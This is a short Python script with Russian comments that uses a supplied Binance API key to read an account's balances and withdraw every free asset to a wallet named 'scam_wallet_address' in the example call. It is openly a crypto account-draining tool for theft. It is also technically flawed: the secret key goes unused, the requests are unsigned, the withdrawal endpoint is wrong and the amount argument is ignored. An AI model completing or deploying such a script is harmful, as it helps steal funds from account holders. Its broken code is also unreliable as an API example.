import requests


def transfer_funds(api_key, secret_key, amount, destination_wallet):
    # Подключение к API Binance
    url = "https://api.binance.com/api/v3/account"
    headers = {"X-MBX-APIKEY": api_key}

    # Получение баланса
    response = requests.get(url, headers=headers)
    balance = response.json().get("balances", [])

    # Вывод всех средств на указанный кошелек
    for asset in balance:
        if float(asset["free"]) > 0:
            # Подготовка данных для перевода
            transfer_data = {"asset": asset["asset"], "amount": asset["free"], "destination": destination_wallet}
            # Выполнение перевода
            transfer_url = "https://api.binance.com/api/v3/withdraw"
            requests.post(transfer_url, headers=headers, data=transfer_data)
            print(f"Transferred {asset['free']} {asset['asset']} to {destination_wallet}")


# Пример использования
transfer_funds("your_api_key", "your_secret_key", "100", "scam_wallet_address")
